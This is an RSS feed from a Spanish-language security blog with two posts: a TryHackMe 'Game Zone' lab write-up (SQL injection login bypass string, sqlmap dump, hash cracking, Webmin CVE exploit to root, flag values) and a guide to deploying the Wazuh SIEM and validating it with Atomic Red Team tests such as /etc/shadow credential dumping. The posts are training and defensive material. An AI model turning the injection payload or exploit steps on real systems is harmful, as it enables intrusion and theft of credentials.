<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>Gabriel Tello</title>
    <link>https://gtello.github.io/es/</link>
    <description>Recent content on Gabriel Tello</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>es-EC</language>
    <managingEditor>gabrieltello10@hotmail.com (Gabriel Tello)</managingEditor>
    <webMaster>gabrieltello10@hotmail.com (Gabriel Tello)</webMaster>
    <copyright>[Gabriel Tello](https://github.com/gtello) © 2024</copyright>
    <lastBuildDate>Fri, 15 Nov 2024 15:30:00 +0000</lastBuildDate>
    <atom:link href="https://gtello.github.io/es/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Game Zone (THM)</title>
      <link>https://gtello.github.io/es/writeups/gamezone/</link>
      <pubDate>Thu, 14 Nov 2024 20:43:00 +0000</pubDate><author>gabrieltello10@hotmail.com (Gabriel Tello)</author>
      <guid>https://gtello.github.io/es/writeups/gamezone/</guid>
      <description>&lt;div style=&#34;text-align: justify;&#34;&gt;&#xD;&#xA;&lt;p&gt;Writeup de la máquina &lt;a href=&#34;https://tryhackme.com/r/room/gamezone&#34;&gt;Game Zone&lt;/a&gt; de TryHackMe.&lt;/p&gt;&#xA;&lt;h2 id=&#34;resumen&#34;&gt;Resumen&lt;/h2&gt;&#xA;&lt;p&gt;Este writeup cubre la intrusión en un entorno web vulnerable, la obtención de acceso mediante SQL Injection, y la escalación de privilegios a root utilizando un exploit de Webmin. Incluye técnicas de recolección de datos, cracking de hashes y uso de herramientas como &lt;em&gt;nmap&lt;/em&gt;, &lt;em&gt;Burp Suite&lt;/em&gt;, &lt;em&gt;sqlmap&lt;/em&gt;, y &lt;em&gt;John the Ripper&lt;/em&gt;.&lt;/p&gt;&#xA;&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;&#xA;&lt;p&gt;El primer paso fue un escaneo de red con nmap para descubrir puertos y servicios activos.&lt;/p&gt;</description>
      <content:encoded><![CDATA[<div style="text-align: justify;">
<p>Writeup de la máquina <a href="https://tryhackme.com/r/room/gamezone">Game Zone</a> de TryHackMe.</p>
<h2 id="resumen">Resumen</h2>
<p>Este writeup cubre la intrusión en un entorno web vulnerable, la obtención de acceso mediante SQL Injection, y la escalación de privilegios a root utilizando un exploit de Webmin. Incluye técnicas de recolección de datos, cracking de hashes y uso de herramientas como <em>nmap</em>, <em>Burp Suite</em>, <em>sqlmap</em>, y <em>John the Ripper</em>.</p>
<h2 id="reconocimiento">Reconocimiento</h2>
<p>El primer paso fue un escaneo de red con nmap para descubrir puertos y servicios activos.</p>
<p><img alt="Resultado nmap" src="/images/posts/gamezone/image1.png"> <center><b>Comando nmap y resultados</b></center></p>
<h3 id="resultado-del-reconocimiento">Resultado del reconocimiento</h3>
<table>
  <thead>
      <tr>
          <th style="text-align: left">Sistema Operativo</th>
          <th style="text-align: left">Dirección IP</th>
          <th style="text-align: left">Puertos Abiertos</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td style="text-align: left">Ubuntu 16.04.6</td>
          <td style="text-align: left">10.10.254.53</td>
          <td style="text-align: left">22 (SSH), 80 (HTTP)</td>
      </tr>
  </tbody>
</table>
<h2 id="explotación">Explotación</h2>
<p>Al encontrar el puerto 80 abierto, accedimos a la página de inicio de Game Zone desde el navegador.</p>
<p><img alt="Página de inicio de Game Zone" src="/images/posts/gamezone/image2.png"> <center><b>Página de inicio de Game Zone</b></center></p>
<p>El cuarto en TryHackMe invitaba a probar SQL Injection (SQLi) en el campo de login. Usando la sentencia <code>' or 1=1 limit 1;#</code> en el campo de usuario y dejando la contraseña en blanco, logramos autenticarnos exitosamente al portal. Sin embargo, al probar más inyecciones manualmente, no tuvimos resultados adicionales, así que decidimos capturar el <strong>POST request</strong> de la búsqueda con <strong>Burp Suite</strong> para con eso automatizar pruebas de SQLi con <strong>SQLmap</strong>.</p>
<p><img alt="Captura de POST request" src="/images/posts/gamezone/image3.png"> <center><b>Captura de POST request</b></center></p>
<p>Utilizamos el comando <code>sqlmap -r POST.txt --dump</code> para verificar y explotar vulnerabilidades de inyección SQL. SQLmap reveló la presencia de una base de datos MySQL y mostró el contenido de la tabla de <code>users</code> con contraseñas hasheadas. Aplicamos <strong>John the Ripper</strong> para descifrar el hash de la contraseña del usuario <code>agent47</code>.</p>
<p><img alt="Ejecución de SQLmap" src="/images/posts/gamezone/image4.png"> <center><b>Ejecución de SQLmap</b></center><br>
<img alt="Crack del hash" src="/images/posts/gamezone/image5.png"> <center><b>Crack del hash</b></center></p>
<p>Con las credenciales, logramos acceder a la máquina vía SSH.</p>
<p><img alt="Ingreso mediante ssh" src="/images/posts/gamezone/image6.png"> <center><b>Ingreso mediante ssh</b></center></p>
<h3 id="escalación-de-privilegios">Escalación de Privilegios</h3>
<p>Dentro de la máquina, ejecutamos <code>ss -tulpn</code> para identificar puertos y servicios adicionales. Observamos que el puerto 10000 estaba bloqueado por un firewall, así que configuramos un túnel SSH con <code>ssh -L 10000:127.0.0.1:10000 agent47@10.10.254.53</code>. Esto nos permitió acceder a un CMS llamado <strong>Webmin</strong>, versión 1.580.</p>
<p><img alt="Puerto 10000 bloqueado por firewall" src="/images/posts/gamezone/image7.png"> <center><b>Puerto 10000 bloqueado por firewall</b></center><br>
<img alt="Portal Webmin" src="/images/posts/gamezone/image8.png"> <center><b>Portal Webmin</b></center></p>
<p>Investigando posibles vulnerabilidades en Webmin, encontramos el exploit <a href="https://github.com/JohnHammond/CVE-2012-2982">CVE-2012-2982</a>. Al ejecutar este exploit, conseguimos acceso root en la máquina.</p>
<p><img alt="Uso de exploit" src="/images/posts/gamezone/image9.png"> <center><b>Uso de exploit</b></center><br>
<img alt="Acceso a usuario root" src="/images/posts/gamezone/image10.png"> <center><b>Acceso a usuario root</b></center></p>
<h2 id="banderas">Banderas</h2>
<p>Ya con privilegios de root, localizamos las dos banderas:</p>
<ul>
<li><code>user.txt</code>: 649ac17b1480ac13ef1e4fa579dac95c</li>
<li><code>root.txt</code>: a4b945830144bdd71908d12d902adeee</li>
</ul>
<h2 id="herramientas-utilizadas">Herramientas Utilizadas</h2>
<p>Durante este análisis, empleamos las siguientes herramientas:</p>
<table>
  <thead>
      <tr>
          <th style="text-align: left">Herramienta</th>
          <th style="text-align: left">Descripción</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td style="text-align: left"><strong>nmap</strong></td>
          <td style="text-align: left">Escaneo de red y detección de puertos abiertos.</td>
      </tr>
      <tr>
          <td style="text-align: left"><strong>Burp Suite</strong></td>
          <td style="text-align: left">Captura y análisis de solicitudes HTTP para SQLi automatizado.</td>
      </tr>
      <tr>
          <td style="text-align: left"><strong>sqlmap</strong></td>
          <td style="text-align: left">Pruebas de SQLi y extracción de datos de la base de datos.</td>
      </tr>
      <tr>
          <td style="text-align: left"><strong>John the Ripper</strong></td>
          <td style="text-align: left">Descifrado del hash de la contraseña del usuario <code>agent47</code> para acceso SSH.</td>
      </tr>
      <tr>
          <td style="text-align: left"><strong>Exploit CVE-2012-2982</strong></td>
          <td style="text-align: left">Vulnerabilidad en Webmin que permitió escalación de privilegios a root.</td>
      </tr>
  </tbody>
</table>
<h2 id="recomendaciones">Recomendaciones</h2>
<ul>
<li><strong>Actualización de sistemas y aplicaciones críticas</strong>, especialmente Webmin y Ubuntu, para corregir vulnerabilidades conocidas.</li>
<li><strong>Restricciones de firewall</strong> en servicios internos y <strong>sanitización de inputs</strong> para prevenir inyecciones SQL.</li>
<li>Implementar un sistema de <strong>gestión de parches</strong> y fomentar el uso de <strong>contraseñas seguras</strong> para reducir el riesgo de escalación de privilegios.</li>
</ul>
</div>
]]></content:encoded>
    </item>
    <item>
      <title>Implementando Wazuh (SIEM)</title>
      <link>https://gtello.github.io/es/projects/wazuh/</link>
      <pubDate>Wed, 13 Nov 2024 19:10:00 +0000</pubDate><author>gabrieltello10@hotmail.com (Gabriel Tello)</author>
      <guid>https://gtello.github.io/es/projects/wazuh/</guid>
      <description>&lt;div style=&#34;text-align: justify;&#34;&gt;&#xD;&#xA;&lt;p&gt;Este proyecto tiene como objetivo mostrar la configuración e integración de &lt;a href=&#34;https://wazuh.com/&#34;&gt;Wazuh&lt;/a&gt; en un entorno profesional para mejorar las operaciones de seguridad. Aquí, vamos a ver cómo instalar, gestionar agentes, configurar de alertas para luego integrarlas con Microsoft Teams y, finalmente, pruebas con Atomic Red Team para validación.&lt;/p&gt;&#xA;&lt;h2 id=&#34;instalación&#34;&gt;Instalación&lt;/h2&gt;&#xA;&lt;p&gt;Para alojar nuestro servidor de Wazuh, usaremos una instancia en AWS EC2 con Ubuntu 24.04. Esta configuración nos da flexibilidad, escalabilidad y facilidad de mantenimiento en una infraestructura basada en la nube.&lt;/p&gt;</description>
      <content:encoded><![CDATA[<div style="text-align: justify;">
<p>Este proyecto tiene como objetivo mostrar la configuración e integración de <a href="https://wazuh.com/">Wazuh</a> en un entorno profesional para mejorar las operaciones de seguridad. Aquí, vamos a ver cómo instalar, gestionar agentes, configurar de alertas para luego integrarlas con Microsoft Teams y, finalmente, pruebas con Atomic Red Team para validación.</p>
<h2 id="instalación">Instalación</h2>
<p>Para alojar nuestro servidor de Wazuh, usaremos una instancia en AWS EC2 con Ubuntu 24.04. Esta configuración nos da flexibilidad, escalabilidad y facilidad de mantenimiento en una infraestructura basada en la nube.</p>
<p><img alt="Especificaciones de EC2" src="/images/posts/wazuh/ec2-specs.png"> <center><b>Especificaciones de la instancia en EC2</b></center></p>
<p>Una vez que nuestro servidor esté actualizado, ejecutamos el siguiente comando para instalar Wazuh:</p>





<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="ln">1</span><span class="cl">curl -sO https://packages.wazuh.com/4.9/wazuh-install.sh <span class="o">&amp;&amp;</span> sudo bash ./wazuh-install.sh -a</span></span></code></pre></div><p>Esto se encargará de la configuración e instalación de todos los componentes principales. El proceso comienza verificando los requisitos del sistema e instalando dependencias. Luego, el script configura la seguridad de Wazuh generando certificados para los componentes de root, administrador, indexador, Filebeat y panel de control, asegurando el manejo seguro de datos en todo el ecosistema.</p>
<p>Una vez configuradas las dependencias y configuraciones, el script instala y arranca secuencialmente los servicios clave de Wazuh: el Wazuh Indexer para almacenamiento de datos, el Wazuh Manager para detección de amenazas, Filebeat para el reenvío de logs y el Wazuh Dashboard para monitoreo. El panel es accesible en <code>https://&lt;ip-servidor-wazuh&gt;:443</code> con las credenciales proporcionadas al final del script de instalación.</p>
<p><img alt="Configuración de Wazuh" src="/images/posts/wazuh/wazuh-setup-loading.png"> <center><b>Configuración de Wazuh</b></center></p>
<p>Cuando iniciamos sesión en nuestro panel de control de Wazuh por primera vez, debemos comenzar configurando grupos para facilitar la gestión de agentes.</p>
<p>Para crear grupos de agentes desde el panel de Wazuh:</p>
<ol>
<li>Navega a <strong>Management</strong> &gt; <strong>Groups</strong> y haz clic en el botón <strong>Add new group</strong>.</li>
<li>Introduce un nombre para el grupo de agentes y haz clic en el botón <strong>Save new group</strong>.</li>
</ol>
<p><img alt="Grupo de agentes" src="/images/posts/wazuh/agent-group.gif"> <center><b>Agregando un nuevo grupo</b></center></p>
<p>Ahora pasaremos al despliegue de nuestros agentes.</p>
<h2 id="despliegue-de-agentes">Despliegue de Agentes</h2>
<p>Para agregar un nuevo agente, hacemos clic en el menú y vamos a <strong>Endpoints Summary</strong> y seleccionamos <strong>Deploy new agent</strong>. Sigue las instrucciones del asistente para desplegar un agente:</p>
<p><img alt="Configuración del agente Wazuh" src="/images/posts/wazuh/wazuh-agent-setup.png"> <center><b>Agregando un nuevo agente</b></center></p>
<p>Si estás configurando un agente de Wazuh en una instancia EC2 de AWS y experimentas problemas de conectividad, revisa la configuración del grupo de seguridad aplicado a tu instancia y asegúrate de que el Security Group adjunto a tu instancia de Wazuh manager permita el tráfico entrante en estos puertos:</p>
<ul>
<li><strong>1514/TCP</strong> – Comunicación del agente</li>
<li><strong>1515/TCP</strong> – Registro del agente</li>
<li><strong>55000/TCP</strong> – Acceso API</li>
</ul>
<p><img alt="Primer agente añadido" src="/images/posts/wazuh/first-agent-added.png"> <center><b>Primer agente añadido</b></center></p>
<p>Añadí como primer agente una instancia de AWS Lightsail que quiero monitorear. Ahora podemos avanzar a configuraciones adicionales, como detección de vulnerabilidades y rootkits, monitoreo de integridad de archivos, etc.</p>
<h2 id="detección-de-vulnerabilidades">Detección de Vulnerabilidades</h2>
<p>A la fecha de publicación, Wazuh viene por defecto con el módulo de detección de vulnerabilidades activado. Para confirmarlo, revisa el <a href="https://documentation.wazuh.com/current/user-manual/reference/ossec-conf/index.html">archivo de configuración</a> ubicado en <code>/var/ossec/etc/ossec.conf</code></p>





<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="nt">&lt;vulnerability-detection&gt;</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">   <span class="nt">&lt;enabled&gt;</span>yes<span class="nt">&lt;/enabled&gt;</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">   <span class="nt">&lt;index-status&gt;</span>yes<span class="nt">&lt;/index-status&gt;</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">   <span class="nt">&lt;feed-update-interval&gt;</span>60m<span class="nt">&lt;/feed-update-interval&gt;</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="nt">&lt;/vulnerability-detection&gt;</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="nt">&lt;indexer&gt;</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">   <span class="nt">&lt;enabled&gt;</span>yes<span class="nt">&lt;/enabled&gt;</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">   <span class="nt">&lt;hosts&gt;</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">      <span class="nt">&lt;host&gt;</span>https://0.0.0.0:9200<span class="nt">&lt;/host&gt;</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">   <span class="nt">&lt;/hosts&gt;</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">   <span class="nt">&lt;ssl&gt;</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">      <span class="nt">&lt;certificate_authorities&gt;</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">         <span class="nt">&lt;ca&gt;</span>/etc/filebeat/certs/root-ca.pem<span class="nt">&lt;/ca&gt;</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">      <span class="nt">&lt;/certificate_authorities&gt;</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">      <span class="nt">&lt;certificate&gt;</span>/etc/filebeat/certs/filebeat.pem<span class="nt">&lt;/certificate&gt;</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">      <span class="nt">&lt;key&gt;</span>/etc/filebeat/certs/filebeat-key.pem<span class="nt">&lt;/key&gt;</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">   <span class="nt">&lt;/ssl&gt;</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl"><span class="nt">&lt;/indexer&gt;</span></span></span></code></pre></div><p>Para verificar las vulnerabilidades detectadas en nuestros agentes, vamos a <strong>Threat Intelligence</strong> &gt; <strong>Vulnerability Detection</strong>.</p>
<p><img alt="Vulnerabilidades detectadas" src="/images/posts/wazuh/wazuh-vulns.png"> <center><b>Vulnerabilidades detectadas</b></center></p>
<h2 id="alertas">Alertas</h2>
<p>El configurar alertas en Wazuh involucra establecer umbrales de alerta, enviar alertas a sistemas externos y gestionar la escalada y filtrado de alertas.</p>
<h3 id="umbrales">Umbrales</h3>
<p>Wazuh asigna un nivel de gravedad (de 0 a 15) a cada evento en base a <a href="https://documentation.wazuh.com/current/user-manual/ruleset/rules/rules-classification.html">reglas</a> predefinidas. Por defecto, Wazuh activa alertas para eventos con un nivel de gravedad de 3 o superior. Puedes ajustar este umbral para controlar qué alertas se generan.</p>
<p>Para modificarlo, ve al archivo <code>ossec.conf</code>, ubica la sección <code>&lt;alerts&gt;</code> y ajusta el valor de <code>&lt;log_alert_level&gt;</code> al umbral deseado.</p>
<p>Por ejemplo, para establecer el nivel mínimo de alerta en 5:</p>





<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="ln">1</span><span class="cl"><span class="nt">&lt;alerts&gt;</span>
</span></span><span class="line"><span class="ln">2</span><span class="cl">  <span class="nt">&lt;log_alert_level&gt;</span>5<span class="nt">&lt;/log_alert_level&gt;</span>
</span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="nt">&lt;/alerts&gt;</span></span></span></code></pre></div><p>Después de realizar cambios en el archivo de configuración, reinicia Wazuh manager para aplicar los nuevos ajustes con:</p>





<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="ln">1</span><span class="cl">sudo systemctl restart wazuh-manager</span></span></code></pre></div><h3 id="filtrado-de-alertas">Filtrado de Alertas</h3>
<p>Para optimizar el sistema de alertas, se puede implementar reglas de filtrado de alertas en Wazuh para suprimir eventos específicos, como intentos de fuerza bruta SSH hacia usuarios inexistentes. Sigue estos pasos:</p>
<ol>
<li>
<p><strong>Identifica el ID de la Regla</strong>: Determina el ID de la regla asociada con la alerta que deseas anular. Puedes encontrar este ID en los registros de alertas o revisando el conjunto de reglas de Wazuh.</p>
<ul>
<li>
<p>Para intentos de fuerza bruta en SSH en Linux, puedes encontrar estos eventos con <code>rule.id:(5551 OR 5712)</code>. Otras reglas relacionadas son <code>5710</code>, <code>5711</code>, <code>5716</code>, <code>5720</code>, <code>5503</code>, <code>5504</code>.</p>
</li>
<li>
<p>Para fallos de inicio de sesión en Windows, puedes encontrar esos eventos con <code>rule.id:(60122 OR 60204)</code>.</p>
</li>
</ul>
</li>
<li>
<p><strong>Crea una Regla Local para Anular Alertas</strong>: Creando una regla local con un nivel de severidad más bajo, puedes evitar que la alerta sea enviada.</p>
<ul>
<li>
<p>Navega al directorio de reglas de Wazuh, ubicado en <code>/var/ossec/etc/rules/local_rules.xml</code>.</p>
</li>
<li>
<p>Agrega la siguiente regla para suprimir la alerta específica:</p>





<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="ln">1</span><span class="cl"><span class="nt">&lt;group</span> <span class="na">name=</span><span class="s">&#34;sshd,&#34;</span><span class="nt">&gt;</span>
</span></span><span class="line"><span class="ln">2</span><span class="cl">  <span class="nt">&lt;rule</span> <span class="na">id=</span><span class="s">&#34;100002&#34;</span> <span class="na">level=</span><span class="s">&#34;0&#34;</span><span class="nt">&gt;</span>
</span></span><span class="line"><span class="ln">3</span><span class="cl">    <span class="nt">&lt;if_sid&gt;</span>5716<span class="nt">&lt;/if_sid&gt;</span>
</span></span><span class="line"><span class="ln">4</span><span class="cl">    <span class="nt">&lt;description&gt;</span>Ignorar alertas de fuerza bruta SSH hacia usuarios inexistentes<span class="nt">&lt;/description&gt;</span>
</span></span><span class="line"><span class="ln">5</span><span class="cl">  <span class="nt">&lt;/rule&gt;</span>
</span></span><span class="line"><span class="ln">6</span><span class="cl"><span class="nt">&lt;/group&gt;</span></span></span></code></pre></div><p>Esta regla establece el nivel de alerta en 0 para el evento especificado, suprimiéndolo. Para un ejemplo más detallado, consulta el <a href="https://github.com/ossec/ossec-hids/blob/master/etc/rules/local_rules.xml">archivo de ejemplo de ossec</a>.</p>
</li>
</ul>
</li>
<li>
<p><strong>Reinicia el Administrador de Wazuh</strong>: Aplica los cambios reiniciando Wazuh manager:</p>





<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="ln">1</span><span class="cl">sudo systemctl restart wazuh-manager</span></span></code></pre></div></li>
</ol>
<h3 id="reenvío-de-alertas">Reenvío de Alertas</h3>
<p>Wazuh puede reenviar alertas a varios sistemas externos, como servidores syslog, direcciones de correo electrónico o plataformas de colaboración como Microsoft Teams.</p>
<ul>
<li>Para reenviar alertas a un servidor syslog, agrega un bloque <code>&lt;syslog_output&gt;</code> en el archivo <code>ossec.conf</code>:</li>
</ul>





<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="ln">1</span><span class="cl"><span class="nt">&lt;syslog_output&gt;</span>
</span></span><span class="line"><span class="ln">2</span><span class="cl">  <span class="nt">&lt;server&gt;</span>192.168.1.241<span class="nt">&lt;/server&gt;</span>
</span></span><span class="line"><span class="ln">3</span><span class="cl">  <span class="nt">&lt;level&gt;</span>9<span class="nt">&lt;/level&gt;</span>
</span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="nt">&lt;/syslog_output&gt;</span></span></span></code></pre></div><p>Esta configuración envía alertas con un nivel de gravedad superior a 9 al servidor syslog especificado.</p>
<ul>
<li>Para recibir alertas por correo electrónico, configura los ajustes de correo en la sección <code>&lt;global&gt;</code> de <code>ossec.conf</code>:</li>
</ul>





<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="nt">&lt;ossec_config&gt;</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">  <span class="nt">&lt;global&gt;</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">    <span class="nt">&lt;email_notification&gt;</span>yes<span class="nt">&lt;/email_notification&gt;</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">    <span class="nt">&lt;email_to&gt;</span>me@test.com<span class="nt">&lt;/email_to&gt;</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">    <span class="nt">&lt;smtp_server&gt;</span>mail.test.com<span class="nt">&lt;/smtp_server&gt;</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">    <span class="nt">&lt;email_from&gt;</span>wazuh@test.com<span class="nt">&lt;/email_from&gt;</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">  <span class="nt">&lt;/global&gt;</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">  <span class="nt">&lt;alerts&gt;</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">    <span class="nt">&lt;email_alert_level&gt;</span>10<span class="nt">&lt;/email_alert_level&gt;</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">  <span class="nt">&lt;/alerts&gt;</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="nt">&lt;/ossec_config&gt;</span></span></span></code></pre></div><p>Esta configuración envía alertas por correo para eventos con un nivel de gravedad de 10 o superior.</p>
<h4 id="integración-con-teams">Integración con Teams</h4>
<p>Para integrar las alertas de Wazuh con Microsoft Teams, tenemos varias opciones: usar el <a href="https://learn.microsoft.com/en-us/microsoftteams/platform/webhooks-and-connectors/how-to/add-incoming-webhook">Webhook de Teams</a>, <a href="https://zapier.com/">Zapier</a>, <a href="https://www.make.com/en">Make.com</a> u otra plataforma similar para enviar alertas a un canal de Teams mediante un webhook. Esto implica crear un script de integración personalizado y configurarlo en <code>ossec.conf</code>.</p>
<p>Usaré <a href="https://github.com/redanthrax/wazuh-teams-integration">esta</a> integración ya configurada con Teams, creada por 

<a href="https://github.com/redanthrax">@redanthrax</a>.</p>
<p>Una vez configurada la integración en el servidor Wazuh, simplemente configúralo así:</p>





<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="ln">1</span><span class="cl"><span class="nt">&lt;integration&gt;</span>
</span></span><span class="line"><span class="ln">2</span><span class="cl">  <span class="nt">&lt;name&gt;</span>custom-teams<span class="nt">&lt;/name&gt;</span>
</span></span><span class="line"><span class="ln">3</span><span class="cl">  <span class="nt">&lt;level&gt;</span>3<span class="nt">&lt;/level&gt;</span>
</span></span><span class="line"><span class="ln">4</span><span class="cl">  <span class="nt">&lt;hook_url&gt;</span>{WEBHOOK URL}<span class="nt">&lt;/hook_url&gt;</span> 
</span></span><span class="line"><span class="ln">5</span><span class="cl">  <span class="nt">&lt;alert_format&gt;</span>json<span class="nt">&lt;/alert_format&gt;</span> 
</span></span><span class="line"><span class="ln">6</span><span class="cl"><span class="nt">&lt;/integration&gt;</span></span></span></code></pre></div><p>Ahora recibiremos alertas en un canal de Teams en cada alerta de nivel 3:</p>
<p><img alt="Notificación de Teams" src="/images/posts/wazuh/teams-alert.png"> <center><b>Notificación de Teams</b></center></p>
<p>Para extender estas alertas, podemos implementar un sistema SOAR para automatizar la priorización, crear procesos de escalamiento, desarrollar playbooks y respuestas a incidentes. Podríamos usar otra buena solución de código abierto como <a href="https://github.com/shuffle/shuffle/blob/main/.github/install-guide.md">Shuffle</a> para esto.</p>
<h2 id="pruebas-y-validación">Pruebas y Validación</h2>
<p>Para validar nuestra implementación de Wazuh y asegurarnos de que las alertas se activen correctamente, usaremos <a href="https://www.atomicredteam.io/">Atomic Red Team</a>, un framework versátil y de código abierto que nos permite simular técnicas de ataque reales mapeadas al marco ATT&amp;CK de MITRE. Específicamente, utilizaremos el módulo PowerShell <a href="https://github.com/redcanaryco/invoke-atomicredteam">Invoke-Atomic</a>, que se puede ejecutar en Windows, MacOS y Linux, siendo una herramienta ideal para probar en todos nuestros agentes.</p>
<h3 id="configuración-de-atomic-red-team">Configuración de Atomic Red Team</h3>
<p>Hagamos algunas pruebas en nuestro servidor Ubuntu. Primero instalaremos PowerShell en Linux con <code>sudo snap install powershell --classic</code> y luego ejecutaremos <code>pwsh</code>. Una vez dentro de PowerShell, podemos proceder a instalar tanto el framework de ejecución como la carpeta de pruebas atómicas, que contiene las definiciones de las pruebas; los comandos que el marco de ejecución ejecutará.</p>





<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="ln">1</span><span class="cl"><span class="nb">IEX </span><span class="p">(</span><span class="nb">IWR </span><span class="s1">&#39;https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1&#39;</span> <span class="n">-UseBasicParsing</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="nb">Install-AtomicRedTeam</span> <span class="n">-getAtomics</span></span></span></code></pre></div><p>Ahora podemos utilizar la función <code>Invoke-AtomicTest</code> para realizar pruebas de seguridad controladas. A continuación pongo ejemplos de técnicas específicas de MITRE ATT&amp;CK que podemos ejecutar para probar nuestra configuración:</p>
<ul>
<li>
<p><strong>Prueba para Transferencia de Herramientas de Ingreso (T1105)</strong>: Simula un intento de transferir archivos desde una fuente remota a un entorno, lo que podría ser indicativo de una descarga de malware o exfiltración de datos. Esta actividad debería activar alertas si Wazuh monitorea adecuadamente la actividad de red y movimiento de archivos.</p>





<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="ln">1</span><span class="cl"><span class="nb">Invoke-AtomicTest</span> <span class="n">T1105</span></span></span></code></pre></div></li>
<li>
<p><strong>Prueba de Volcado de Credenciales (T1003)</strong>: Ejecuta una simulación de volcado de credenciales para verificar si Wazuh captura eventos potenciales de acceso a credenciales.</p>





<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="ln">1</span><span class="cl"><span class="nb">Invoke-AtomicTest</span> <span class="n">T1003</span><span class="p">.</span><span class="py">008</span> <span class="c"># OS Credential Dumping: /etc/passwd and /etc/shadow</span></span></span></code></pre></div></li>
<li>
<p><strong>Prueba de Creación de Tareas Programadas (T1053)</strong>: Usa tareas programadas para simular técnicas de persistencia y verificar si Wazuh alerta sobre la creación de tareas.</p>





<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="ln">1</span><span class="cl"><span class="nb">Invoke-AtomicTest</span> <span class="n">T1053</span><span class="p">.</span><span class="py">003</span> <span class="c"># Scheduled Task/Job: Cron</span></span></span></code></pre></div></li>
<li>
<p><strong>Prueba de Ejecución de Intérprete de Comandos y Scripts (T1059)</strong>: Simula actividad de scripting sospechosa que Wazuh debería detectar según los ajustes de umbral.</p>





<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="ln">1</span><span class="cl"><span class="nb">Invoke-AtomicTest</span> <span class="n">T1059</span><span class="p">.</span><span class="py">004</span> <span class="c"># Command and Scripting Interpreter: Unix Shell</span></span></span></code></pre></div></li>
</ul>
<h3 id="verificación-de-alertas-en-wazuh">Verificación de Alertas en Wazuh</h3>
<p>Después de ejecutar cada prueba, navegaremos al panel de Wazuh para verificar las alertas generadas. Podemos ver los eventos correspondientes a cada prueba de Atomic Red Team en <strong>Threat Intelligence</strong> &gt; <strong>MITRE ATT&amp;CK</strong>. Podemos revisar los detalles para confirmar que las alertas coinciden con los umbrales configurados según lo previsto.</p>
<p><img alt="Pruebas de MITRE ATT&amp;CK detectadas" src="/images/posts/wazuh/mitre.png"> <center><b>Pruebas de MITRE ATT&amp;CK detectadas</b></center></p>
<p>Al completar la implementación, configuración y validación de Wazuh, hemos creado una configuración de SIEM sólida y proactiva capaz de detectar, alertar y responder a eventos de seguridad de manera efectiva. Con integraciones para una alerta fluida, monitoreo de vulnerabilidades y pruebas con Atomic Red Team, este despliegue de Wazuh fortalece nuestra postura de seguridad organizacional. A medida que evolucionan las amenazas, esta configuración puede personalizarse aún más para satisfacer las necesidades dinámicas de las operaciones de seguridad modernas, convirtiéndola en un activo valioso en el conjunto de herramientas de nuestro SOC. Este proyecto destaca el poder de las soluciones de código abierto como Wazuh para construir un entorno de ciberseguridad resiliente y adaptable.</p>
